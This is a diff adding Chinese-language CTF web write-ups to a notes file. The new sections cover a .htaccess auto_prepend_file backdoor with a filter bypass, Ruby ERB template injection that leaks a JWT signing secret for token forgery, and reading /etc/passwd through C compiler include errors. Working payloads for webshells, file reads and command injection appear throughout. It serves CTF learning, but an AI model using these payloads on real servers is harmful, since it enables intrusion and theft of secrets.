@@ -166,6 +166,77 @@
 
 4. 利用蚁剑连接，得到网站目录
 
+## 羊城杯2020 easyphp(.htaccess制造后门)
+
+1. 源码
+
+```php
+ $files = scandir('./');                          #文件目录
+    foreach($files as $file) {                    #循环目录下文件文件
+        if(is_file($file)){                       #如果文件不是 index.php
+            if ($file !== "index.php") {
+                unlink($file);                    #删除
+            }
+        }
+    }
+    if(!isset($_GET['content']) || !isset($_GET['filename'])) {    #需要传filenamecontent
+        highlight_file(__FILE__);
+        die();
+    }
+    $content = $_GET['content'];                             #内容过滤
+    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
+        echo "Hacker";
+        die();
+    }
+    $filename = $_GET['filename'];
+    if(preg_match("/[^a-z\.]/", $filename) == 1) {         #文件名过滤
+        echo "Hacker";
+        die();
+    }
+    $files = scandir('./');                          
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== "index.php") {               #如果不是index.php则删除
+                unlink($file);
+            }
+        }
+    }
+    file_put_contents($filename, $content . "\nHello, world");    #写入文件。
+?>
+```
+
+2. 解题
+
+一开始想着把一句话木马写入文件，但是发现无效，index.php写不进去，其他文件可以写进去但是不能解析。
+
+考虑写入.htaccess文件，它比较灵活，不需要重启服务器，也不需要管理员权限。其格式为php_value 名称 值，在这里写入木马（以注释的方式），然后在页面顶部加载它（auto_prepend_file）就行：
+
+```htaccess
+php_value auto_prepend_file .htaccess
+#<?php phpinfo();?>
+```
+
+但是过滤了“file”这个关键字，且文件尾部自动加上了"\nHello, world"，无法正常写入，正常写入会因为文件不符合.htaccess的书写规范而报错。为了解决这两个问题，我加了转义符可以换行且转义掉\n：
+
+```htaccess
+php_value auto_prepend_fil\
+e ".htaccess"
+#<?php phpinfo();?>
+#\
+```
+payload: 将上面的内容url编码一下就行
+
+获取flag的话将 # 后面的php语句换成 system('cat /fla?') 就行了
+
+这道题目也有另一种解法
+
+**通过php_value来设置preg_macth正则回溯次数**
+
+```url
+?filename=.htaccess&content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\
+```
+后面的和上一个方法的就差不多了。
+
 ## 护网杯2018-easy_tornado(render模板注入)——存在msg
 
 - render简介：render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用
@@ -1788,7 +1859,7 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
 
 这道题需要将请求方式改为POST，GET方式得不到想要的东西
 
-## SSIT(服务端模板注入)
+## SSTI(服务端模板注入)
 
 ### SSTI payload:
 
@@ -2131,6 +2202,162 @@ Twig
     [RC4加密脚本](./rc4.py)
 
     题目有过滤，但是没什么用。就给一个警告信息。可以采用反转，字符串拼接绕过。
+
+### SCTF2019 Flag Shop(Ruby ERB模板注入)
+
+[【技术分享】手把手教你如何完成Ruby ERB模板注入](https://www.anquanke.com/post/id/86867)
+
+1. 尝试爆破
+
+看到题目感觉和cookie相关，先抓了一下包，发现了jwt，尝试爆破，没有马上出来结果，所以key应该不是靠爆破拿到的
+
+2. 找源码
+
+尝试访问一下robots.txt,里面提示了源码位置
+
+```ruby
+require 'sinatra'
+require 'sinatra/cookies'
+require 'sinatra/json'
+require 'jwt'
+require 'securerandom'
+require 'erb'
+
+set :public_folder, File.dirname(__FILE__) + '/static'
+
+FLAGPRICE = 1000000000000000000000000000
+ENV["SECRET"] = SecureRandom.hex(64)
+
+configure do
+  enable :logging
+  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
+  file.sync = true
+  use Rack::CommonLogger, file
+end
+
+get "/" do
+  redirect '/shop', 302
+end
+
+get "/filebak" do
+  content_type :text
+  erb IO.binread __FILE__
+end
+
+get "/api/auth" do
+  payload = { uid: SecureRandom.uuid , jkl: 20}
+  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
+  cookies[:auth] = auth
+end
+
+get "/api/info" do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
+  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
+end
+
+get "/shop" do
+  erb :shop
+end
+
+get "/work" do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
+  auth = auth[0]
+  unless params[:SECRET].nil?
+    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
+      puts ENV["FLAG"]
+    end
+  end
+
+  if params[:do] == "#{params[:name][0,7]} is working" then
+
+    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
+    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
+    cookies[:auth] = auth
+    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
+  end
+end
+
+post "/shop" do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
+
+  if auth[0]["jkl"] < FLAGPRICE then
+
+    json({title: "error",message: "no enough jkl"})
+  else
+
+    auth << {flag: ENV["FLAG"]}
+    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
+    cookies[:auth] = auth
+    json({title: "success",message: "jkl is good thing"})
+  end
+end
+
+
+def islogin
+  if cookies[:auth].nil? then
+    redirect to('/shop')
+  end
+end
+```
+没看出来这是什么代码，但是发现key很长，所以爆破行不通，到这没思路了
+
+3. ERB模板注入
+
+去找了一下wp，这是ruby语法，存在ruby ERB模板注入
+
+重点是这一块,传入的参数do和name相等，则输出。
+
+```ruby
+if params[:do] == "#{params[:name][0,7]} is working" then
+
+    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
+    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
+    cookies[:auth] = auth
+    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
+end
+```
+ruby模板注入形式
+
+```ruby
+<%= 7 * 7 %>
+<%= File.open('/etc/passwd').read %>
+```
+
+其中`<%=%>`占用五个字符，而题目只给了七个可控字符。
+
+所以这里利用ruby的预定义变量，只用两个字符。但是幸运的是，Ruby为我们提供了预定义字符。
+
+>$' 最后一次模式匹配中匹配部分之后的字符串
+
+让我们看看运行到这句话之前的最后一个模式匹配在哪里？
+
+```ruby
+unless params[:SECRET].nil?
+    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
+      puts ENV["FLAG"]
+    end
+```
+
+就是在匹配SECRET，这个预定义字符的作用是将匹配之后的字符进行返回。
+
+```ruby
+hello world //我设置匹配字符为e
+llo world //这就是返回值
+```
+
+我们要想得到完整的SECRET，那就必须传进去一个空的SECRET，让最后的返回值是完整的。
+所以我们如此构造payload
+
+```ruby
+?name=<%=$'%>&do=<%=$' is working%>&SECRET=
+```
+
+这样我们就能拿到jwt的key了
+
+拿到后用这个key伪造jwt，把jkl改成足够的数量，然后发送过去，flag就在jwt中
 
 ## PHP伪协议
 
@@ -5969,3 +6196,19 @@ file "";head /fla*;"" ;
 ?comm1=index.php";tac /fla?;"&comm2
 ```
 ?表示任意一个字符，从而来绕过flag的匹配。
+
+## FireshellCTF2020 Caas(C语言include 报错引出文件内容)
+
+功能就是将用户提交的c源代码编译成elf可执行文件
+
+猜测后端是将用户提交的代码保存成c源文件，然后调用系统命令gcc编译文件
+如果编译报错，将命令执行的返回值返回给用户，如果编译成功，将输出的elf文件返回给用户
+
+看过wp，发现可以利用 *编译器的include报错读出引用文件的部分内容。*
+
+```c
+#include "/etc/passwd"
+```
+提交以后会输出报错信息，会发现在报错信息中就有文件中的内容
+
+同理可以用这种方式获取flag。
